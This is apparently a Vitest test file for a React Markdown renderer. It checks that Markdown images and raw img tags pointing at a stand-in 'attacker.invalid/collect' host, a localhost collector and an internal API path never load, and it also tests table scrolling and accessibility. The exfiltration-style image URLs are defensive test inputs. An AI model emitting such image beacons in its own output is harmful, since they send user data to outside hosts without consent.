import { render } from '@testing-library/react';
import { afterEach, describe, expect, it, vi } from 'vitest';

import Markdown from './markdown';

const tableMarkdown = [
    '| Name | Email | Token |',
    '| --- | --- | --- |',
    '| sample | sample@example.com | TOKEN{0000000000000000000000000000000000000000000000000000000000000000} |',
].join('\n');

afterEach(() => {
    vi.restoreAllMocks();
});

describe('Markdown', () => {
    it.each([undefined, 'diagnostic'])('never mounts Markdown images (search: %s)', (searchValue) => {
        const sources = [
            'https://attacker.invalid/collect?value=DUMMY',
            '//attacker.invalid/collect?value=DUMMY',
            'http://127.0.0.1:18992/collect?value=DUMMY',
            '/api/v1/info?value=DUMMY',
        ];
        const { container } = render(
            <Markdown searchValue={searchValue}>{sources.map((src) => `![diagnostic](${src})`).join('\n\n')}</Markdown>,
        );

        expect(container.querySelector('img, source, link[rel="preload"]')).toBeNull();
        expect(container.querySelector('[src], [srcset]')).toBeNull();
        expect(container.textContent).toContain('diagnostic');
        expect(container.textContent).not.toContain('attacker.invalid');
    });

    it('keeps a normal link clickable and raw image HTML inert', () => {
        const { container } = render(
            <Markdown>{'[reference](https://example.com/)\n\n<img src="https://attacker.invalid/pixel">'}</Markdown>,
        );

        expect(container.querySelector('a')).toHaveAttribute('href', 'https://example.com/');
        expect(container.querySelector('img')).toBeNull();
    });

    it('wraps a table in a horizontally scrollable container so wide content cannot widen the message list', () => {
        const { container } = render(<Markdown>{tableMarkdown}</Markdown>);

        const table = container.querySelector('table');
        expect(table).not.toBeNull();
        expect(table?.parentElement?.className).toContain('overflow-x-auto');
    });

    it('keeps the table wrapped when search highlighting is active', () => {
        const { container } = render(<Markdown searchValue="sample">{tableMarkdown}</Markdown>);

        const table = container.querySelector('table');
        expect(table?.parentElement?.className).toContain('overflow-x-auto');
    });

    it('takes a named tab stop while the table is wider than the space it has', () => {
        vi.spyOn(Element.prototype, 'scrollWidth', 'get').mockReturnValue(743);
        vi.spyOn(Element.prototype, 'clientWidth', 'get').mockReturnValue(606);

        const { container } = render(<Markdown>{tableMarkdown}</Markdown>);

        const region = container.querySelector('table')?.parentElement;
        expect(region).toHaveAttribute('tabindex', '0');
        expect(region).toHaveAttribute('role', 'region');
        expect(region).toHaveAccessibleName('Table');
    });

    it('stays out of the tab order when the whole table fits', () => {
        vi.spyOn(Element.prototype, 'scrollWidth', 'get').mockReturnValue(606);
        vi.spyOn(Element.prototype, 'clientWidth', 'get').mockReturnValue(606);

        const { container } = render(<Markdown>{tableMarkdown}</Markdown>);

        expect(container.querySelector('table')?.parentElement).not.toHaveAttribute('tabindex');
    });
});
